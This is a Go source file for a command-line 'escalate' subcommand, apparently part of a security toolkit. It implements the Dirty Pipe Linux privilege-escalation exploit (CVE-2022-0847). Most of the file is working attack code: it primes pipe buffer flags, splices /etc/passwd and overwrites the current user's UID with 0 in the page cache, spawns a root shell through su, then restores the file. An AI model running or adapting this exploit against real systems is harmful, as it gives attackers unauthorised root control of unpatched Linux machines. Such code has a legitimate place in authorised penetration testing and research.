//go:build linux

/*
Copyright © 2022 Vigilant Cyber Systems, Inc.
Sean Heath
<sheath@vigilantsys.com>
Marc Bohler
<mbohler@vigilantsys.com>
Dylan Harbaugh
<dharbaugh@vigilantsys.com>


Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
*/

/* Credit:
 *   Max Kellerman <max.kellermann@ionos.com>
 *   CVE Reference: CVE-2022-0847
 *   More info: https://dirtypipe.cm4all.com/
 */

package cmd

import (
	"fmt"
	"os"
	"os/exec"
	"io/ioutil"
	"os/user"
	"bufio"
	"strings"
	"syscall"

	"github.com/spf13/cobra"
)

/*
 * Credit: https://github.com/eremus-dev/Dirty-Pipe-sudo-poc
 */
// escalateCmd represents the escalate command
var escalateCmd = &cobra.Command{
	Use:   "escalate",
	Short: "attempt to escalate privileges to root on Linux",
	Long:  `Escalate privileges to root on Linux using the dirtypipe exploit.`,
	Run: func(cmd *cobra.Command, args []string) {
		// Get original file data for cleanup
		var backupPath = "/tmp/passwd"
		fmt.Printf("Backing up %s to %s\n", escalatePath, backupPath)
		err := Backup(escalatePath, backupPath)
		if err != nil {
			fmt.Printf("error making backup: %s\n", err)
			return
		}

		// Create pipe
		fmt.Println("Contaminating pipe", escalatePath)
		r, w, err := os.Pipe()
		if err != nil {
			fmt.Println(fmt.Errorf("error creating pipe: %w", err))
			return
		}
		defer r.Close()
		defer w.Close()

		// Initialize CAN_MERGE flags
		w, err = PreparePipe(r, w)
		if err != nil {
			fmt.Println(fmt.Errorf("error creating pipe: %w", err))
			return
		}

		username, err := getCurrentUser()
		if err != nil {
			fmt.Println(fmt.Errorf("error getting username: %w", err))
			return
		}
		offset, toWrite, original, err := findOffsetOfUserInPasswd(username, escalatePath)
		if err != nil {
			fmt.Println(fmt.Errorf("error reading file: %w", err))
		}

		// Overwrite readonly file
		fmt.Printf("Modifying %s in page cache\n", escalatePath)
		err = Exploit(w, escalatePath, offset, []byte(toWrite))
		if err != nil {
			fmt.Println(fmt.Errorf("error performing the exploit: %w", err))
			return
		}

		// Execute root shell
		var sh = getDefaultShell()
		fmt.Printf("Popping root shell\n\n", username)
		var sargs = []string{"-c", "su " +  username}
		err = Shell(sh, sargs)
		if err != nil {
			fmt.Println(fmt.Errorf("error spawning shell"))
		}

		// Cleanup
		fmt.Printf("Restoring %s to original state\n", escalatePath)
		err = Exploit(w, escalatePath, offset, []byte(original))
		if err != nil {
			fmt.Println(fmt.Errorf("error cleaning up file: %w\n", err))
			return

		}

		fmt.Printf("\nRemember to remove %s:\n", backupPath)
		fmt.Printf("\trm %s\n", backupPath)

	},
}

var escalatePath string

func init() {
	rootCmd.AddCommand(escalateCmd)

	// Here you will define your flags and configuration settings.

	escalateCmd.Flags().StringVar(&escalatePath, "path", "/etc/passwd", "Path to the passwd file")

	// Cobra supports local flags which will only run when this command
	// is called directly, e.g.:
	// escalateCmd.Flags().BoolP("toggle", "t", false, "Help message for toggle")
}

func getDefaultShell() string {
	return os.Getenv("SHELL")
}

func getCurrentUser() (string, error) {
	currentUser, err := user.Current()
	if err != nil {
		return "", err
	}

	username := currentUser.Username
	return username, nil
}

func findOffsetOfUserInPasswd(user string, path string) (int64, string, string, error) {
	var fileOffset = 0
	var toWrite = ""

	file, err := os.Open(path)
	if err != nil {
		return -1, "", "", fmt.Errorf("error opening file: %w", err)
	}
	defer file.Close()

	fscanner := bufio.NewScanner(file)
    	for fscanner.Scan() {
		var line = fscanner.Text() + "\n"
		if !strings.Contains(line, user) {
			fileOffset += len(line)	
		} else {
			var fields = strings.Split(line, ":")
			fileOffset += len(strings.Join(fields[:1], ":"))
			var original = strings.Join(fields[1:], ":")
			toWrite = ":0:" + strings.Join(fields[3:], ":")

			// Pad end of line with new line chars to we don't error
			var lengthDiff = len(original) - len(toWrite)
			if lengthDiff > 0 {
				toWrite = toWrite[:len(toWrite)] + strings.Repeat("\n", lengthDiff)
			}
			return int64(fileOffset), toWrite, original, nil
		}
    	}

	return -1, "", "", fmt.Errorf("User was not found in %s", path)

}

func Backup(src string, dest string) error {
	bytesRead, err := ioutil.ReadFile(src)
   	if err != nil {
		return fmt.Errorf("Error opening file: %w", err)
	}

	err = ioutil.WriteFile(dest, bytesRead, 0644)

	if err != nil {
		return fmt.Errorf("Error opening file: %w", err)
	}
	return nil
}

const PAGE int = 4096
const PIPELEN int = 65536

func PreparePipe(read *os.File, write *os.File) (*os.File, error) {

	// Fill the entire pipe with data to initialize Pipe Buffer CAN_MERGE flags
	var data = []byte(strings.Repeat("A", PIPELEN))
	_, err := write.Write(data)
	if err != nil {
		return nil, fmt.Errorf("error writing to pipe: %w", err)
	}

	// Drain the pipe leaving the flags in memory
	var buf = make([]byte, 0, PIPELEN)
	_, err = read.Read(buf[:PIPELEN])
	if err != nil {
		return nil, fmt.Errorf("error reading from pipe: %w", err)
	}

	return write, nil

}

func Exploit(write *os.File, path string, fileOffset int64, data []byte) error {

	// Open file in read-only mode
	file, err := os.Open(path) // O_RDONLY mode
	if err != nil {
		return fmt.Errorf("error opening file: %w", err)

	}

	// Splice page of file into pipe
	syscall.Splice(int(file.Fd()), &fileOffset, int(write.Fd()), nil, 1, 0)
	if err != nil {
		return fmt.Errorf("error splicing file into pipe: %w", err)

	}

	_, err = write.Write(data)
	if err != nil {
		return fmt.Errorf("error overwriting file data: %w", err)

	}

	return nil

}

func Shell(path string, args []string) error {
	cmd := exec.Command(path, args...)
	cmd.Stdin = os.Stdin
    	cmd.Stdout = os.Stdout
    	cmd.Stderr = os.Stderr
	err := cmd.Run()
	if err != nil {
		return fmt.Errorf("error spawning shell: %w", err)
	}

	return nil

}
